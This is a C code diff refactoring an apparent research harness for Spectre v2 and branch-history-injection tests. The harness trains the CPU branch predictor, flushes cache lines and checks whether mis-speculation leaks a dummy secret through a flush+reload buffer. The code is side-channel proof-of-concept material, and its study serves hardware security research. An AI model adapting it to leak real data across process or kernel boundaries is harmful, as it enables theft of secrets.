@@ -13,7 +13,7 @@
 // #define NR_BTB_EVICT_VICTIM 2
 #define SZ_BTB_EVSET 2
 
-enum enum_test_spec {
+enum test_type {
     TEST_SPEC_V2,
     TEST_SPEC_NO_BSE,
     TEST_SPEC_BSE,
@@ -24,19 +24,19 @@ typedef struct {
     branch_chain_t bh_chain;
     void *ib_target;
     uint64_t *bh_targets;
-    int nr_cond_bh;
+    uint64_t nr_cond_bh;
     void **ib_ptr_ptr;
     char *frbuf;
     char *ptr_secret;
 } bh_chain_params_t;
 
 typedef struct {
-    enum enum_test_spec test_spec;
+    enum test_type test_spec;
     uint64_t nr_test_passes;
     uint64_t nr_train_passes;
-    uint64_t nr_train_flows;
-    bh_chain_params_t* train_params;
-    bh_chain_params_t* test_params;
+    uint64_t nr_trains;
+    bh_chain_params_t** trains;
+    bh_chain_params_t* test;
     void (*before_train)(void);
     void (*before_test)(void);
 } test_obj_t;
@@ -97,7 +97,7 @@ void goto_chain(branch_chain_t br_chain, uint64_t *bh_targets, void **ib_ptr_ptr
 {
     // Populate BHB with conditional branches
     for (int i = 0; i < nr_cond_bh; i++) NOP(8);
-    // Populate PHR with indirect branches and train the BPU
+    // Populate PHR with indirect branches and trains the BPU
     br_chain(bh_targets, 0, NULL, ib_ptr_ptr, frbuf, ptr_secret);
 }
 
@@ -128,9 +128,9 @@ void do_spectre_test(test_obj_t test_specs)
 {
     uint64_t nr_test_passes = test_specs.nr_test_passes;
     uint64_t nr_train_passes = test_specs.nr_train_passes;
-    uint64_t nr_train_flows = test_specs.nr_train_flows;
-    bh_chain_params_t* train_params = test_specs.train_params;
-    bh_chain_params_t* test_params = test_specs.test_params;
+    uint64_t nr_trains = test_specs.nr_trains;
+    bh_chain_params_t** trains = test_specs.trains;
+    bh_chain_params_t* test = test_specs.test;
 
     for (int test_iter = 0; test_iter < nr_test_passes; test_iter++)
     {
@@ -139,33 +139,33 @@ void do_spectre_test(test_obj_t test_specs)
             // Warm-up the BPU
             test_specs.before_train();
             // Train the BPU with desired records
-            for (int train_flow = 0; train_flow<nr_train_flows; train_flow++)
+            for (int train_flow = 0; train_flow<nr_trains; train_flow++)
             {
-                bh_chain_params_t current = train_params[train_flow];
-                void **ib_ptr_ptr = current.ib_ptr_ptr;
-                void *ib_target = current.ib_target;
+                bh_chain_params_t* current = trains[train_flow];
+                void **ib_ptr_ptr = current->ib_ptr_ptr;
+                void *ib_target = current->ib_target;
                 *ib_ptr_ptr = ib_target;
 
-                branch_chain_t bh_chain = current.bh_chain;
-                uint64_t *bh_targets = current.bh_targets;
-                void *_frbuf = current.frbuf;
-                void *ptr_secret = current.ptr_secret;
-                uint64_t nr_cond_bh = current.nr_cond_bh;
+                branch_chain_t bh_chain = current->bh_chain;
+                uint64_t *bh_targets = current->bh_targets;
+                void *_frbuf = current->frbuf;
+                void *ptr_secret = current->ptr_secret;
+                uint64_t nr_cond_bh = current->nr_cond_bh;
                 goto_chain(bh_chain, bh_targets, ib_ptr_ptr, nr_cond_bh, _frbuf, ptr_secret);
             }
         }
         // Massage the BPU to a desired state
         test_specs.before_test();
-        void **ib_ptr_ptr = test_params->ib_ptr_ptr;
-        void *ib_target = test_params->ib_target;
+        void **ib_ptr_ptr = test->ib_ptr_ptr;
+        void *ib_target = test->ib_target;
         *ib_ptr_ptr = ib_target;
 
         // Run the test and see if we can see the desired mis-speculation
-        branch_chain_t bh_chain = test_params->bh_chain;
-        uint64_t *bh_targets = test_params->bh_targets;
-        char *_frbuf = test_params->frbuf;
-        char *ptr_secret = test_params->ptr_secret;
-        uint64_t nr_cond_bh = test_params->nr_cond_bh;
+        branch_chain_t bh_chain = test->bh_chain;
+        uint64_t *bh_targets = test->bh_targets;
+        char *_frbuf = test->frbuf;
+        char *ptr_secret = test->ptr_secret;
+        uint64_t nr_cond_bh = test->nr_cond_bh;
 
         FLUSH_DCACHE(ib_ptr_ptr);
         FLUSH_DCACHE(SC_ENCODE_ADDR(_frbuf, ptr_secret));
@@ -272,15 +272,15 @@ int main()
         .frbuf = frbuf,
         .ptr_secret = &dummy_secret
     };
-    bh_chain_params_t train_passes[2] = {chain_leak, chain_safe};
+    bh_chain_params_t *train_passes[2] = {&chain_leak, &chain_safe};
 
     test_obj_t test_spec_specv2 = {
         .test_spec = TEST_SPEC_V2,
         .nr_test_passes = NR_TEST_ITER,
         .nr_train_passes = 2,
-        .nr_train_flows = 1,
-        .train_params = (bh_chain_params_t*)&train_passes,
-        .test_params = &chain_mispred,
+        .nr_trains = 1,
+        .trains = (bh_chain_params_t**)train_passes,
+        .test = &chain_mispred,
         .before_train = &init_btb_targets,
         .before_test = &t_empty
     };
@@ -288,9 +288,9 @@ int main()
         .test_spec = TEST_SPEC_NO_BSE,
         .nr_test_passes = NR_TEST_ITER,
         .nr_train_passes = 2,
-        .nr_train_flows = 1,
-        .train_params = (bh_chain_params_t*)&train_passes,
-        .test_params = &chain_safe,
+        .nr_trains = 1,
+        .trains = (bh_chain_params_t**)train_passes,
+        .test = &chain_safe,
         .before_train = &init_btb_targets,
         .before_test = &t_empty
     };
@@ -298,9 +298,9 @@ int main()
         .test_spec = TEST_SPEC_BSE,
         .nr_test_passes = NR_TEST_ITER,
         .nr_train_passes = 2,
-        .nr_train_flows = 1,
-        .train_params = (bh_chain_params_t*)&train_passes,
-        .test_params = &chain_safe,
+        .nr_trains = 1,
+        .trains = (bh_chain_params_t**)train_passes,
+        .test = &chain_safe,
         .before_train = &init_btb_targets,
         .before_test = &walk_btb_evset
     };
